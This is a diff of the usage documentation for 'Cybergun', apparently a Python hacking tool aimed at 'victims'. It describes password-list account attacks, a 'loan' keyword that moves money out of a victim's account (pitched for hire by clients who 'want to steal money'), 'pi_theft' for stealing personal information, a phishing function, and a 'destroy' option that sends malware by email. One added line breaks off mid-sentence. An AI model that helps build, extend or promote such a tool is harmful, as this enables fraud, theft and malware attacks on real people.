@@ -21,15 +21,12 @@ List of Commands:
     string, and then list the victim's email address inside the third argument. In the fourth argument, list a keyword.
     One built-in keyword is "loan," where you are able to draw money from the victim's account into another account.
     Another built-in you can use is "pi_theft," which will tell the
-    program to steal the victim's personal information, or "destroy," which
-    will delete all files and apps from the victim's device and replace them
-    with malware. When using "loan," provide the account you want to transfer the money to (useful mostly when you are hired and your client wants to steal money).     Lastly, you must include a potential password or an entire list
+    program to steal the victim's personal information. When using "loan," provide the account you want to transfer the money to (useful mostly when you are hired and your client wants to steal money).     Lastly, you must include a potential password or an entire list
     of potential passwords for the program to work with. You can either
     create one inside the program:
     >>> listname=['string1', 'string2', 'string3'...]
     >>> #This is how you create a list in Python, so you can apply this code snippet anywhere in Python.
-    and put it in the pwlist parameter, or you can create/find a file,
-    and download it and type the file path into the pwlistpath parameter. Preferred file type is .txt or .lst.
+    and put it in the pwlist parameter.
 
     phish(victim, domain, email_address): Function that will phish for the victim's personal
     information. Type the account name and the domain it is from inside the
@@ -45,6 +42,7 @@ Examples:
      
     1. If you want to run Cybergun in the command prompt, open it and type "python," then when it opens, type import Cybergun as cg
     2. Cannot hack phones or local accounts (was not designed for that).
-    3. If you have any ideas, feel free to tell us.
+    3. "Destroy" keyword will send malware via the victim's email. A
+    4. If you have any ideas, feel free to tell us.
 
 Happy Cybergunning!
